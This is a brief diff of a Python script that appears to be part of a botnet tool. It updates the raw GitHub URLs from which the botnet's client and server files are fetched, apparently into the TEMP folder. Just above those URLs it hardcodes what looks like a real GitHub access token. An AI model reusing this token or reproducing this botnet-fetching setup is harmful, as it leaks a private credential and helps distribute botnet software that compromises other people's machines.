@@ -5,8 +5,8 @@ from colorama import Fore
 
 
 github_Token    = "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"
-client_file     = "raw.githubusercontent.com/Callumgm/Botnet-WEBGUI/master/webgui/client.py"
-server_file     = "raw.githubusercontent.com/Callumgm/Botnet-WEBGUI/master/webgui/server.py"
+client_file     = "raw.githubusercontent.com/Callumgm/Botnet-WEBGUI/master/src/client.py"
+server_file     = "raw.githubusercontent.com/Callumgm/Botnet-WEBGUI/master/src/server.py"
 
 
 temp = os.getenv("TEMP")
